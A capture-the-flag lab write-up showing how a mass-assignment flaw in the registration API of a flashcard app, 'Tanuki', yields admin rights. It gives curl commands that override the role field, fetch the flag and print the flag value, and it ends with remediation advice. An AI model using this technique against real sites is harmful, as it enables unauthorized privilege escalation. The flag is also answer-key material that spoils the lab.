# Tanuki SRS — Mass Assignment Privilege Escalation

**Target:** `https://lab-1782573766676-hvz7a9.labs-app.bugforge.io/`
**Vulnerability:** Mass Assignment → Privilege Escalation
**Flag:** `bug{LAsFmNpCWbZjHiL16vKwKlZhVWMak2Zh}`

---

## 1. Recon

The target is "Tanuki," a React SPA flashcard app served by an Express backend.
Since the HTML is just a React shell, the API surface lives in the JS bundle.

```bash
curl -s .../static/js/main.22728e1f.js -o main.js
grep -oE '"/api/[^"]*"' main.js | sort -u
```

Discovered endpoints (notably):

- `/api/register`
- `/api/login`
- `/api/admin/flag`   ← privileged
- `/api/admin/users`, `/api/admin/decks`, `/api/admin/cards`

## 2. Identifying the bug

The registration handler posts the **entire** form state object directly:

```js
const t = await Ro.post("/api/register", e);
// e = { username, email, password, full_name, role: "user" }
```

The React state initializer includes a `role` field defaulting to `"user"`:

```js
useState({ username:"", email:"", password:"", full_name:"", role:"user" })
```

The UI never exposes `role`, but the backend blindly persists every field the
client sends — a classic **mass assignment** flaw. Nothing server-side strips
or validates the privilege field.

## 3. Exploitation

Register a fresh account, overriding `role` to `admin`:

```bash
curl -s -X POST .../api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"pwn30086","email":"pwn30086@x.com","password":"Passw0rd!","full_name":"P","role":"admin"}'
```

Response confirms the elevated role and returns a JWT:

```json
{"token":"eyJ...","user":{"id":4,"username":"pwn30086","email":"pwn30086@x.com","full_name":"P","role":"admin"}}
```

## 4. Retrieving the flag

Use the admin token against the privileged endpoint:

```bash
curl -s .../api/admin/flag -H "Authorization: Bearer <token>"
```

```json
{"flag":"bug{LAsFmNpCWbZjHiL16vKwKlZhVWMak2Zh}"}
```

## 5. Remediation

- **Whitelist** accepted fields on registration; never bind client input to
  privilege attributes (`role`, `isAdmin`, etc.).
- Assign roles **server-side** only (default `user`).
- Enforce authorization server-side on every `/api/admin/*` route, independent
  of the role claimed at registration.
